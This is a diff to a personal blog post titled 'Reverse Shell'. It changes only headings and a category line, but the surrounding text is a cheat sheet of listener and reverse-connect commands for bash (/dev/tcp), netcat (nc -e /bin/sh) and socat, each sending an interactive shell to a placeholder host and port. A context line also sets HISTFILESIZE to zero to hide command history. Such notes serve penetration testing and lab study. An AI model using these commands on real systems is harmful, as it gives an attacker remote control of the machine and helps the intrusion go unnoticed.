@@ -2,7 +2,7 @@
 layout: post
 title:  "Reverse Shell"
 date:   2021-11-17 21:22:50 +0800
-categories: notes
+categories: notes update
 tags: bash socat nc
 ---
 
@@ -17,13 +17,13 @@ $ export HISTFILESIZE=0
 
 ## bash
 
-1. Listen
+**Listen**
 
 ```bash
 $ nc -lvvp {port}
 ```
 
-2. Reverse connect
+**Reverse connect**
 
 ```bash
 $ bash -i >& /dev/tcp/{host}/{port} 0>&1
@@ -31,13 +31,13 @@ $ bash -i >& /dev/tcp/{host}/{port} 0>&1
 
 ## nc
 
-1. Listen
+Listen
 
 ```bash
 $ nc -lvvp {port}
 ```
 
-2. Reverse connect
+**Reverse connect**
 
 ```bash
 $ nc -e /bin/sh {host} {port}
@@ -63,13 +63,13 @@ $ rm -f {name}
 
 ## socat
 
-1. Listen
+**Listen**
 
 ```bash
 $ socat file:`tty`,raw,echo=0 tcp-listen:{port}
 ```
 
-2. Reverse connect
+**Reverse connect**
 
 ```bash
 $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}
